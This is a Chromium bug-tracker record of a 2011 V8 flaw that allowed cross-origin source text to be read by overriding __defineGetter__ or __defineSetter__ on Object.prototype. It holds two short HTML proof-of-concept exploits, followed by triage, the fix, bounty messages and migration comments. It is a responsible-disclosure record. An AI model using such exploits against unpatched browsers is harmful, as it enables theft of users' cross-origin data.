# Security: Arbitrary cross-origin bypass using __defineGetter__ prototype override

| Field | Value |
|-------|-------|
| **Issue ID** | [40094104](https://issues.chromium.org/issues/40094104) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | di...@gmail.com |
| **Assignee** | lr...@chromium.org |
| **Created** | 2011-08-18 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

You can access cross-origin text by hooking into **defineGetter** and using SourceLocation object.

**VERSION**  

Chrome Version: [15.0.854.0] + [dev]  

Operating System: [Win, 7, Service pack 1]

**REPRODUCTION CASE**

<html><head>
<script type="text/javascript">
Object.prototype.\_\_defineGetter\_\_("line", function () {
alert(this.script.sourceSlice().sourceText());
});
</script>
<script src="http://google.com"></script>
</head><body></body></html>

## Timeline

### pa...@chromium.org (2011-08-18)

Confirmed on 15.0.855.0 on OS X, confirmed not present on 13 on OS X.

### sc...@gmail.com (2011-08-19)

Does this affect M14 beta? If so, we'd probably scramble to fix it for M14 stable.
I'll mail Danno / Mads. They love crushing regressions :)

### sc...@gmail.com (2011-08-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-19)

[Empty comment from Monorail migration]

### ag...@chromium.org (2011-08-22)

We should make sure to always set the line property directly without invoking setters. Lasse, can you have a look?

### lr...@chromium.org (2011-08-22)

I have made a fix for this on v8 bleeding edge (r8979).
It has been ported to trunk by our standard Monday push-to-trunk, and I have ported it to the 3.3 and 3.4 branches too.
(Obviously, I did some cleanup of surrounding code while being there and introduced another bug, although much less severe. I'll port the fix for that too as soon as our buildbots have given it a spin).

### sc...@gmail.com (2011-08-22)

Thanks Lasse!
Affects M14 but not M13, so Daniel has caught a nice regression :) This will be considered for reward.

### di...@gmail.com (2011-08-22)

Could be more than a regression :). Here's another variant that seems to reproduce on stable 13.0.782.112 and also on 15.0.860.0 (Developer Build 97689 Windows)

<html><head>

<script type="text/javascript">
Object.prototype.__defineSetter__("end", function () {
	alert(this.script.sourceSlice().sourceText());
});
</script>

<script src="http://google.com"></script>
</head><body></body></html>


### sc...@gmail.com (2011-08-24)

@divricean: good to see you back ;-) My pleasure to offer a $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### di...@gmail.com (2011-08-24)

Thank you, good to be back. Nice welcoming reward, I'll be back more often then :)

### sc...@gmail.com (2011-09-08)

@divricean: surprise! We recently decided to up the reward for well-reported UXSS bugs to $2000. Your report came in before that decision but we decided to retroactively apply it here as a gesture of thanks for all your nice UXSS bugs.

### di...@gmail.com (2011-09-09)

Awesome! So you DO know my birthday is next Monday :) 
Thanks again.

### sc...@gmail.com (2011-09-09)

Happy Birthday! Have a $FAVOURITE_BEVERAGE on us!

### sc...@gmail.com (2011-09-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-09-23)

Payment in system. Hope you had a nice bday :)

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### is...@google.com (2020-11-03)

This issue was migrated from crbug.com/chromium/93416?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094104)*
